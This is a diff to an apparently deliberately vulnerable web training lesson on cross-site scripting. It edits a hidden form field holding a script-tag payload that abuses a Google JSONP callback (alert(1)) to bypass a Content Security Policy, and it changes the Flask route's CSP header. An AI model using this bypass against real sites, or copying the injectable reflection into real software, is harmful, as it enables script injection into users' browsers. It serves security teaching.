@@ -18,7 +18,7 @@
 </form>
 <form autocomplete="off" class="form-inline">
     <div class="form-group mx-sm-3 mb-2">
-        <input type="hidden" class="form-control" name="name" id="name" value="<script src='https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1)'></script>">
+        <input type="hidden" class="form-control" name="name" id="name" value="<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>">
     </div>
     <div class="form-group mx-sm-3 mb-2">
         <button type="submit" class="btn btn-primary mb-2">Bypass CSP with JSONP endpoint</button>
@@ -39,12 +39,11 @@
 ```python
 @app.route('/a7-xss-csp')
 def get_a7_xss_csp():
-    comments = models.Comment.query.all()
     if request.args.get('name'):
-        resp = make_response(render_template("xss-csp.html",comments=comments,name=request.args['name'],title="A7 - Cross-Site Scripting (XSS)"))
-        resp.headers['Content-Security-Policy']="script-src 'self' https://*.google.com; object-src 'none';"
+        resp = make_response(render_template("xss-csp.html",name=request.args['name'],title="A7 - Cross-Site Scripting (XSS)"))
+        resp.headers['Content-Security-Policy']="script-src 'self';"
     else:
-        resp = make_response(render_template("xss-csp.html",comments=comments,title="A7 - Cross-Site Scripting (XSS)"))
+        resp = make_response(render_template("xss-csp.html",title="A7 - Cross-Site Scripting (XSS)"))
     return resp
 ```
         </div>
